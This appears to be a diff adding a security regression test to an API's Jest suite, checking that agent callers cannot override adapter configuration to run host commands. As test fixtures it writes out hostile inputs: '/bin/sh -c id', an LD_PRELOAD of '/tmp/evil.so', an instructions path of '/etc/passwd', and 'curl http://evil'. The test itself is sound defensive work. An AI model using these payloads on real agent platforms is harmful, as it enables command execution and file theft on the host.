@@ -318,4 +318,48 @@ describe("issue workspace command authorization", () => {
     expect(res.body.error).toContain("host-executed workspace commands");
     expect(mockIssueService.update).not.toHaveBeenCalled();
   });
+
+  it("rejects agent callers that override assignee adapterConfig command/args/cwd/env (SEC-P0-1)", async () => {
+    mockIssueService.getById.mockResolvedValue(makeIssue());
+    const app = await createApp({
+      type: "agent",
+      agentId: "agent-1",
+      companyId: "company-1",
+      source: "agent_key",
+      runId: "run-1",
+    });
+
+    const createRes = await request(app)
+      .post("/api/companies/company-1/issues")
+      .send({
+        title: "Exploit command override",
+        assigneeAdapterOverrides: {
+          adapterConfig: {
+            command: "/bin/sh",
+            extraArgs: ["-c", "id"],
+            cwd: "/etc",
+            env: { LD_PRELOAD: "/tmp/evil.so" },
+          },
+        },
+      });
+
+    expect(createRes.status).toBe(403);
+    expect(createRes.body.error).toContain("host-executed workspace commands");
+    expect(mockIssueService.create).not.toHaveBeenCalled();
+
+    const patchRes = await request(app)
+      .patch("/api/issues/issue-1")
+      .send({
+        assigneeAdapterOverrides: {
+          adapterConfig: {
+            instructionsFilePath: "/etc/passwd",
+            workspaceRuntime: { services: [{ name: "evil", command: "curl http://evil" }] },
+          },
+        },
+      });
+
+    expect(patchRes.status).toBe(403);
+    expect(patchRes.body.error).toContain("host-executed workspace commands");
+    expect(mockIssueService.update).not.toHaveBeenCalled();
+  });
 });
